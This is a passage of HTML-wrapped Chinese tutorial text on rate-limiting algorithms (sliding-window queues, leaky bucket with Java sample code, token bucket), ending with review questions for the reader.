data-annotation-key="gkann_5156467138" data-annotation-type="annotation"><span data-slate-string="true">return</span></span></span><span 
data-slate-leaf="true" data-offset-key="2005:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2005:3"><span class=" gkhl-literal" data-slate-object="annotation" 
data-annotation-key="gkann_0271244119" data-annotation-type="annotation"><span data-slate-string="true">false</span></span></span><span 
data-slate-leaf="true" data-offset-key="2005:4"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2006"> <span data-slate-object="text" data-key="2007"><span data-slate-leaf="true" 
data-offset-key="2007:0" data-first-offset="true"><span data-slate-string="true"> }</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2008"> <span data-slate-object="text" data-key="2009"><span data-slate-leaf="true" 
data-offset-key="2009:0" data-first-offset="true"><span data-slate-string="true">}</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 266px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-310f3cdf " data-slate-type="paragraph" data-slate-object="block" 
data-key="2010"> <span data-slate-object="text" data-key="2011"><span data-slate-leaf="true" 
data-offset-key="2011:0" data-first-offset="true"><span data-slate-string="true">你可以看到，这个算法从时间消耗上看，颇为高效，但是在支持滑动窗口的同时，我们也能看到，付出的代价是一个数量级上相当于窗口宽度的空间复杂度，其实它就是这个队列的空间消耗，在这里队列最大长度就是 
10000。</span></span></span> </div> <div class="se-d18f6e8f " data-slate-type="paragraph" data-slate-object="block" 
data-key="2012"> <span data-slate-object="text" data-key="2013"><span data-slate-leaf="true" 
data-offset-key="2013:0" data-first-offset="true"><span data-slate-string="true">如果我们允许队列的长度较大，队列造成的空间消耗和单个处理请求的最大时间消耗就可能会成为问题，我们能优化一下吗？</span></span></span> 
</div> <div class="se-440deede " data-slate-type="paragraph" data-slate-object="block" data-key="2014"> 
<span data-slate-object="text" data-key="2015"><span data-slate-leaf="true" data-offset-key="2015:0" 
data-first-offset="true"><span data-slate-string="true">能。那么这种情况下，</span></span></span><span 
data-slate-object="text" data-key="2016"><span data-slate-leaf="true" data-offset-key="2016:0" 
data-first-offset="true"><span class="se-c979f6c2" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">一种“妥协”的办法就是，队列中的每个元素，不再是实际请求精确到毫秒的时间戳，而是特定某一秒中包含的请求数目</span></span></span></span><span 
data-slate-object="text" data-key="2017"><span data-slate-leaf="true" data-offset-key="2017:0" 
data-first-offset="true"><span data-slate-string="true">，比如队列的其中一个元素表示 3:00:01 到 3:00:02 之间对应有 
150 个请求。用这种方法，对于上述这个一分钟内流量限制的问题，我们可以把队列长度严格控制在 60（因为是 60 秒），每个元素都表示特定某一秒中的请求数目。当然，这个方法损失的是时间窗口毫秒级的精度。而这，就是我们控制时间窗口队列的长度所采用的一种较为常见的优化方式，它虽</span></span></span><span 
data-slate-object="text" data-key="2018"><span data-slate-leaf="true" data-offset-key="2018:0" 
data-first-offset="true"><span class="se-d5626bec" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">损失了精度，但却降低了空间复杂度</span></span></span></span><span data-slate-object="text" 
data-key="2019"><span data-slate-leaf="true" data-offset-key="2019:0" data-first-offset="true"><span 
data-slate-string="true">。</span></span></span> </div> <div class="se-0f933f14 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2020"> <span data-slate-object="text" data-key="2021"><span 
data-slate-leaf="true" data-offset-key="2021:0" data-first-offset="true"><span data-slate-string="true">好，规则已经做到严格匹配了，可是在实际应用中，在很多情况下，这还是有问题。为什么呢？</span></span></span> 
</div> <h3 class="se-48fb789f" data-slate-type="heading" data-slate-object="block" data-key="2022"><span 
data-slate-object="text" data-key="2023"><span data-slate-leaf="true" data-offset-key="2023:0" 
data-first-offset="true"><span data-slate-string="true">细化控制粒度</span></span></span></h3> <div 
class="se-71e13cbf " data-slate-type="paragraph" data-slate-object="block" data-key="2024"> 
<span data-slate-object="text" data-key="2025"><span data-slate-leaf="true" data-offset-key="2025:0" 
data-first-offset="true"><span data-slate-string="true">这要从流量控制的动机说起，</span></span></span><span 
data-slate-object="text" data-key="2026"><span data-slate-leaf="true" data-offset-key="2026:0" 
data-first-offset="true"><span class="se-09483f07" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">我们建立流量控制这个系统的目的，是为了避免对于系统的冲击，而无论使用固定窗口，还是滑动窗口，根据当前的规则，我们都只能限定这个一分钟窗口内的流量符合要求，却不能做到更细粒度的控制。</span></span></span></span> 
</div> <div class="se-503a801f " data-slate-type="paragraph" data-slate-object="block" data-key="2027"> 
<span data-slate-object="text" data-key="2028"><span data-slate-leaf="true" data-offset-key="2028:0" 
data-first-offset="true"><span data-slate-string="true">举个极端的例子，一分钟内这一万个请求，如果均匀地分布在这一分钟的窗口中，系统很可能就不会出问题；但如果这一万个请求，全部集中在最开始的一秒钟内，系统就压垮了，这样的流量控制就没有起到有效的防御作用了。</span></span></span> 
</div> <div class="se-8a87aa7f " data-slate-type="paragraph" data-slate-object="block" data-key="2029"> 
<span data-slate-object="text" data-key="2030"><span data-slate-leaf="true" data-offset-key="2030:0" 
data-first-offset="true"><span data-slate-string="true">那好，如果我们要做到系统可以接受的更细的粒度。举例来说，如果我们可以做到按秒控制，那么继续按照 
10000 个 / 分钟来计算的话，这个限制就可以换算成不要超过 10000/60 ≈ 167 个 / 秒。</span></span></span> </div> <h3 class="se-18e53bec" 
data-slate-type="heading" data-slate-object="block" data-key="2031"><span data-slate-object="text" 
data-key="2032"><span data-slate-leaf="true" data-offset-key="2032:0" data-first-offset="true"><span 
data-slate-string="true">漏桶算法</span></span></span></h3> <div class="se-9e478c14 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2033"> <span data-slate-object="text" data-key="2034"><span 
data-slate-leaf="true" data-offset-key="2034:0" data-first-offset="true"><span data-slate-string="true">漏桶（Leaky 
Bucket）算法就是可以带来更细粒度控制的限流算法，它的粒度取决于系统所支持的准确最小时间间隔，比如毫秒。</span></span></span> </div> <div class="se-d13cf629 
" data-slate-type="paragraph" data-slate-object="block" data-key="2035"> <span data-slate-object="text" 
data-key="2036"><span data-slate-leaf="true" data-offset-key="2036:0" data-first-offset="true"><span 
data-slate-string="true">你可以想象一个有缺漏的桶，无论我们怎样往里面放水（发送请求），水都有可能以两种方式从桶中排出来：</span></span></span> 
</div> <div class="se-d05e2dfa" data-slate-type="list" data-slate-object="block" data-key="2037"> 
<div class="se-9d67b681 se-d5f47721" data-slate-type="list-line" data-slate-object="block" 
data-key="2038"> <span data-slate-object="text" data-key="2039"><span data-slate-leaf="true" 
data-offset-key="2039:0" data-first-offset="true"><span data-slate-string="true">从漏口往外流，如果桶中有水，这个流速是一定的（这就是</span></span></span><span 
data-slate-object="text" data-key="2040"><span data-slate-leaf="true" data-offset-key="2040:0" 
data-first-offset="true"><span class="se-37233437" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">系统满载时，限流的流速</span></span></span></span><span data-slate-object="text" 
data-key="2041"><span data-slate-leaf="true" data-offset-key="2041:0" data-first-offset="true"><span 
data-slate-string="true">）；</span></span></span> </div> <div class="se-e386bbe8 se-8ef33094" 
data-slate-type="list-line" data-slate-object="block" data-key="2042"> <span data-slate-object="text" 
data-key="2043"><span data-slate-leaf="true" data-offset-key="2043:0" data-first-offset="true"><span 
data-slate-string="true">注水太快，水从桶中溢出（这就是</span></span></span><span data-slate-object="text" 
data-key="2044"><span data-slate-leaf="true" data-offset-key="2044:0" data-first-offset="true"><span 
class="se-1ddea2d8" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">请求被拒绝了，限流效果产生</span></span></span></span><span 
data-slate-object="text" data-key="2045"><span data-slate-leaf="true" data-offset-key="2045:0" 
data-first-offset="true"><span data-slate-string="true">）。</span></span></span> </div> </div> 
<div class="se-446ed24b " data-slate-type="paragraph" data-slate-object="block" data-key="2046"> 
<span data-slate-object="text" data-key="2047"><span data-slate-leaf="true" data-offset-key="2047:0" 
data-first-offset="true"><span data-slate-string="true">另外，由于请求的最小单位是一个，因此桶的大小不得小于 1。我们要求请求发送的速度不得小于漏水的速度，但我们更多时候会设置一定的桶容量，这就意味着系统允许一定程度的富余以应对突发量。这个桶大小，也就是突发量，被称为 
burst。</span></span></span> </div> <div class="se-0ef837ff " data-slate-type="paragraph" data-slate-object="block" 
data-key="2048"> <span data-slate-object="text" data-key="2049"><span data-slate-leaf="true" 
data-offset-key="2049:0" data-first-offset="true"><span data-slate-string="true">于是，我们每次都可以根据流速以及上一次的流量检测时间，获知在考虑漏水的情况下，如果接纳当前请求，那么桶中将达到怎样的水位，是否会超过 
burst。如果不超过，就允许此次访问，反之拒绝。参考代码如下：</span></span></span> </div> <div class="se-9ea343e2 se-69f64656" 
data-slate-type="pre" data-slate-object="block" data-key="2050" data-code-language="java"> 
<div class="se-9f1a86a2 se-f563a5c7"> <span></span> </div> <div class="se-1eb67b0d"> <div class="se-866681fc 
se-ec9336de" data-code-line-number="1"></div> <div class="se-866681fc se-ec9336de" data-code-line-number="2"></div> 
<div class="se-866681fc se-ec9336de" data-code-line-number="3"></div> <div class="se-866681fc 
se-ec9336de" data-code-line-number="4"></div> <div class="se-866681fc se-ec9336de" data-code-line-number="5"></div> 
<div class="se-866681fc se-ec9336de" data-code-line-number="6"></div> <div class="se-866681fc 
se-ec9336de" data-code-line-number="7"></div> <div class="se-866681fc se-ec9336de" data-code-line-number="8"></div> 
<div class="se-866681fc se-ec9336de" data-code-line-number="9"></div> <div class="se-866681fc 
se-ec9336de" data-code-line-number="10"></div> <div class="se-866681fc se-ec9336de" data-code-line-number="11"></div> 
<div class="se-866681fc se-ec9336de" data-code-line-number="12"></div> <div class="se-866681fc 
se-ec9336de" data-code-line-number="13"></div> <div class="se-866681fc se-ec9336de" data-code-line-number="14"></div> 
<div class="se-866681fc se-ec9336de" data-code-line-number="15"></div> <div class="se-866681fc 
se-ec9336de" data-code-line-number="16"></div> <div class="se-866681fc se-ec9336de" data-code-line-number="17"></div> 
<div class="se-866681fc se-ec9336de" data-code-line-number="18"></div> </div> <div class="se-f778fb82 
ps ps--active-x"> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2051"> <span data-slate-object="text" data-key="2052"><span data-slate-leaf="true" 
data-offset-key="2052:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0792569464" data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span><span 
data-slate-leaf="true" data-offset-key="2052:1"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2052:2"><span class=" gkhl-class" data-slate-object="annotation" 
data-annotation-key="gkann_3800551680" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_5465307538" data-annotation-type="annotation"><span 
data-slate-string="true">class</span></span></span></span><span data-slate-leaf="true" data-offset-key="2052:3"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_3800551680" data-annotation-type="annotation"><span 
data-slate-string="true"> </span></span></span><span data-slate-leaf="true" data-offset-key="2052:4"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_5010852316" data-annotation-type="annotation"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_3800551680" data-annotation-type="annotation"><span 
data-slate-string="true">RateLimiter</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="2052:5"><span class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_3800551680" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="2052:6"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2053"> <span data-slate-object="text" data-key="2054"><span data-slate-leaf="true" 
data-offset-key="2054:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2054:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0407688507" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="2054:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2054:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6644218720" data-annotation-type="annotation"><span data-slate-string="true">float</span></span></span><span 
data-slate-leaf="true" data-offset-key="2054:4"><span data-slate-string="true"> leakingRate 
= </span></span><span data-slate-leaf="true" data-offset-key="2054:5"><span class=" gkhl-number" 
data-slate-object="annotation" data-annotation-key="gkann_4418171106" data-annotation-type="annotation"><span 
data-slate-string="true">10000f</span></span></span><span data-slate-leaf="true" data-offset-key="2054:6"><span 
data-slate-string="true">/</span></span><span data-slate-leaf="true" data-offset-key="2054:7"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_4257506384" 
data-annotation-type="annotation"><span data-slate-string="true">60</span></span></span><span 
data-slate-leaf="true" data-offset-key="2054:8"><span data-slate-string="true">/</span></span><span 
data-slate-leaf="true" data-offset-key="2054:9"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_7038378993" data-annotation-type="annotation"><span data-slate-string="true">1000</span></span></span><span 
data-slate-leaf="true" data-offset-key="2054:10"><span data-slate-string="true">; </span></span><span 
data-slate-leaf="true" data-offset-key="2054:11"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_4394938738" data-annotation-type="annotation"><span data-slate-string="true">// 
每一毫秒能够漏掉的水</span></span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="2055"> <span data-slate-object="text" data-key="2056"><span 
data-slate-leaf="true" data-offset-key="2056:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="2056:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_4714137648" data-annotation-type="annotation"><span 
data-slate-string="true">private</span></span></span><span data-slate-leaf="true" data-offset-key="2056:2"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="2056:3"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_0968084263" 
data-annotation-type="annotation"><span data-slate-string="true">float</span></span></span><span 
data-slate-leaf="true" data-offset-key="2056:4"><span data-slate-string="true"> remaining = 
</span></span><span data-slate-leaf="true" data-offset-key="2056:5"><span class=" gkhl-number" 
data-slate-object="annotation" data-annotation-key="gkann_5497958380" data-annotation-type="annotation"><span 
data-slate-string="true">0</span></span></span><span data-slate-leaf="true" data-offset-key="2056:6"><span 
data-slate-string="true">; </span></span><span data-slate-leaf="true" data-offset-key="2056:7"><span 
class=" gkhl-comment" data-slate-object="annotation" data-annotation-key="gkann_7186366956" 
data-annotation-type="annotation"><span data-slate-string="true">// 桶中余下的水</span></span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2057"> <span data-slate-object="text" data-key="2058"><span data-slate-leaf="true" 
data-offset-key="2058:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2058:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3972587850" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="2058:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2058:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6409746364" data-annotation-type="annotation"><span data-slate-string="true">float</span></span></span><span 
data-slate-leaf="true" data-offset-key="2058:4"><span data-slate-string="true"> burst = </span></span><span 
data-slate-leaf="true" data-offset-key="2058:5"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_7568311421" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="2058:6"><span data-slate-string="true">; </span></span><span 
data-slate-leaf="true" data-offset-key="2058:7"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_9344630589" data-annotation-type="annotation"><span data-slate-string="true">// 
桶容量</span></span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="2059"> <span data-slate-object="text" data-key="2060"><span 
data-slate-leaf="true" data-offset-key="2060:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="2060:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_8186775682" data-annotation-type="annotation"><span 
data-slate-string="true">private</span></span></span><span data-slate-leaf="true" data-offset-key="2060:2"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="2060:3"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_2477337573" 
data-annotation-type="annotation"><span data-slate-string="true">long</span></span></span><span 
data-slate-leaf="true" data-offset-key="2060:4"><span data-slate-string="true"> lastTime = 
System.currentTimeMillis(); </span></span><span data-slate-leaf="true" data-offset-key="2060:5"><span 
class=" gkhl-comment" data-slate-object="annotation" data-annotation-key="gkann_9240701825" 
data-annotation-type="annotation"><span data-slate-string="true">// 最近一次流量检测时间</span></span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2061"> <span data-slate-object="text" data-key="2062"><span data-slate-leaf="true" 
data-offset-key="2062:0" data-first-offset="true"><span data-slate-string="true"> </span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2063"> <span data-slate-object="text" data-key="2064"><span data-slate-leaf="true" 
data-offset-key="2064:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2064:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0766360156" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_8803303957" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="2064:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0766360156" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="2064:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1256806138" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_0766360156" data-annotation-type="annotation"><span 
data-slate-string="true">boolean</span></span></span></span><span data-slate-leaf="true" data-offset-key="2064:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0766360156" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="2064:5"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0766360156" data-annotation-type="annotation"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_8818920668" data-annotation-type="annotation"><span 
data-slate-string="true">isAllowed</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="2064:6"><span class=" gkhl-params" data-slate-object="annotation" data-annotation-key="gkann_8888809554" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0766360156" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="2064:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0766360156" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="2064:8"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2065"> <span data-slate-object="text" data-key="2066"><span data-slate-leaf="true" 
data-offset-key="2066:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2066:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9067333840" data-annotation-type="annotation"><span data-slate-string="true">long</span></span></span><span 
data-slate-leaf="true" data-offset-key="2066:2"><span data-slate-string="true"> now = System.currentTimeMillis();</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2067"> <span data-slate-object="text" data-key="2068"><span data-slate-leaf="true" 
data-offset-key="2068:0" data-first-offset="true"><span data-slate-string="true"> remaining 
= Math.max(</span></span><span data-slate-leaf="true" data-offset-key="2068:1"><span class=" 
gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_3625306621" data-annotation-type="annotation"><span 
data-slate-string="true">0</span></span></span><span data-slate-leaf="true" data-offset-key="2068:2"><span 
data-slate-string="true">, remaining - (now-lastTime)*leakingRate); </span></span><span data-slate-leaf="true" 
data-offset-key="2068:3"><span class=" gkhl-comment" data-slate-object="annotation" data-annotation-key="gkann_7582256112" 
data-annotation-type="annotation"><span data-slate-string="true">// 如果漏完了，余下的就是 0，不能出现负数</span></span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2069"> <span data-slate-object="text" data-key="2070"><span data-slate-leaf="true" 
data-offset-key="2070:0" data-first-offset="true"><span data-slate-string="true"> lastTime 
= now;</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="2071"> <span data-slate-object="text" data-key="2072"><span 
data-slate-leaf="true" data-offset-key="2072:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="2073"> <span data-slate-object="text" data-key="2074"><span 
data-slate-leaf="true" data-offset-key="2074:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="2074:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_9931940254" data-annotation-type="annotation"><span 
data-slate-string="true">if</span></span></span><span data-slate-leaf="true" data-offset-key="2074:2"><span 
data-slate-string="true"> (remaining+</span></span><span data-slate-leaf="true" data-offset-key="2074:3"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_5926050708" 
data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="2074:4"><span data-slate-string="true"> &lt;= burst) 
{</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="2075"> <span data-slate-object="text" data-key="2076"><span 
data-slate-leaf="true" data-offset-key="2076:0" data-first-offset="true"><span data-slate-string="true"> 
remaining++;</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="2077"> <span data-slate-object="text" data-key="2078"><span 
data-slate-leaf="true" data-offset-key="2078:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="2078:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_7741676340" data-annotation-type="annotation"><span 
data-slate-string="true">return</span></span></span><span data-slate-leaf="true" data-offset-key="2078:2"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="2078:3"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_3494364179" 
data-annotation-type="annotation"><span data-slate-string="true">true</span></span></span><span 
data-slate-leaf="true" data-offset-key="2078:4"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2079"> <span data-slate-object="text" data-key="2080"><span data-slate-leaf="true" 
data-offset-key="2080:0" data-first-offset="true"><span data-slate-string="true"> }</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2081"> <span data-slate-object="text" data-key="2082"><span data-slate-leaf="true" 
data-offset-key="2082:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2082:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3225730350" data-annotation-type="annotation"><span data-slate-string="true">return</span></span></span><span 
data-slate-leaf="true" data-offset-key="2082:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2082:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3307354592" data-annotation-type="annotation"><span data-slate-string="true">false</span></span></span><span 
data-slate-leaf="true" data-offset-key="2082:4"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2083"> <span data-slate-object="text" data-key="2084"><span data-slate-leaf="true" 
data-offset-key="2084:0" data-first-offset="true"><span data-slate-string="true"> }</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2085"> <span data-slate-object="text" data-key="2086"><span data-slate-leaf="true" 
data-offset-key="2086:0" data-first-offset="true"><span data-slate-string="true">}</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 158px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-0179a8e6 " data-slate-type="paragraph" data-slate-object="block" 
data-key="2087"> <span data-slate-object="text" data-key="2088"><span data-slate-leaf="true" 
data-offset-key="2088:0" data-first-offset="true"><span data-slate-string="true">从复杂度上你也可以看到，我们通过变量 
remaining 记录每一个请求到达的时刻，桶中水的余量，整个空间复杂度是常量级的。当然了，我们的控制已经不是针对“一分钟规则”了，控制粒度上更加细化，更符合我们对系统保护的实际要求，因此这个方法的应用更广。</span></span></span> 
</div> <h3 class="se-e6e25013" data-slate-type="heading" data-slate-object="block" data-key="2089"><span 
data-slate-object="text" data-key="2090"><span data-slate-leaf="true" data-offset-key="2090:0" 
data-first-offset="true"><span data-slate-string="true">令牌桶算法</span></span></span></h3> <div 
class="se-43ee1b2d " data-slate-type="paragraph" data-slate-object="block" data-key="2091"> 
<span data-slate-object="text" data-key="2092"><span data-slate-leaf="true" data-offset-key="2092:0" 
data-first-offset="true"><span data-slate-string="true">还有一种和漏桶算法本质上一致，但是实现上有所不同的方法，叫做令牌桶（Token 
Bucket）算法。说它们实现上不同是因为，漏桶是不断往外漏水，看能不能把陆续到来的请求给消耗掉；而令牌桶呢，则是在令牌桶内会定期放入令牌，每一个请求到来，都要去令牌桶内取令牌，取得了才可以继续访问系统，否则就会被流量控制系统拒绝掉。</span></span></span> 
</div> <div class="se-7b1bff80 " data-slate-type="paragraph" data-slate-object="block" data-key="2093"> 
<span data-slate-object="text" data-key="2094"><span data-slate-leaf="true" data-offset-key="2094:0" 
data-first-offset="true"><span data-slate-string="true">就像我们的问题，每 60*1000/10000 = 6 毫秒就要向令牌桶内放置一个令牌。和前面的漏桶算法一样，我们并不一定要真的建立一个放入令牌的线程来做这个放入令牌的工作，而是使用和上面类似的算法，在请求到来的时候，根据上次剩余的令牌数和上次之后流逝的时间，计算当前桶内是否还有完整的一张令牌，如果没有令牌，就拒绝请求，否则允许请求。因此，从这个角度说，漏桶和令牌桶这二者在思想本质上是一致的。</span></span></span> 
</div> <h2 class="se-29b63198" data-slate-type="heading" data-slate-object="block" data-key="2095"><span 
data-slate-object="text" data-key="2096"><span data-slate-leaf="true" data-offset-key="2096:0" 
data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> <div 
class="se-1d1e7850 " data-slate-type="paragraph" data-slate-object="block" data-key="2097"> 
<span data-slate-object="text" data-key="2098"><span data-slate-leaf="true" data-offset-key="2098:0" 
data-first-offset="true"><span data-slate-string="true">今天我通过一个常见的流量控制系统，向你介绍了全栈开发中几个典型的算法，包括基于固定时间窗口的简单计数法，滑动时间窗口的队列法，还有实际应用中更为常见的漏桶算法和令牌桶算法。希望通过今天的学习，你已经理解了它们的工作原理。</span></span></span> 
</div> <div class="se-ffe2bb08 " data-slate-type="paragraph" data-slate-object="block" data-key="2099"> 
<span data-slate-object="text" data-key="2100"><span data-slate-leaf="true" data-offset-key="2100:0" 
data-first-offset="true"><span data-slate-string="true">现在我来提两个问题吧：</span></span></span> </div> 
<div class="se-e230d9ec" data-slate-type="list" data-slate-object="block" data-key="2101"> 
<div class="se-9b43f5d7 se-44bc53b1" data-slate-type="list-line" data-slate-object="block" 
data-key="2102"> <span data-slate-object="text" data-key="2103"><span data-slate-leaf="true" 
data-offset-key="2103:0" data-first-offset="true"><span data-slate-string="true">漏桶算法我给出了示例代码，而具有一定相似性的令牌桶算法我没有给出示例代码，如果你理解了这两者，能否写出令牌桶算法的代码呢？</span></span></span> 
</div> <div class="se-13ce6e3f se-5a17d6fc" data-slate-type="list-line" data-slate-object="block" 
data-key="2104"> <span data-slate-object="text" data-key="2105"><span data-slate-leaf="true" 
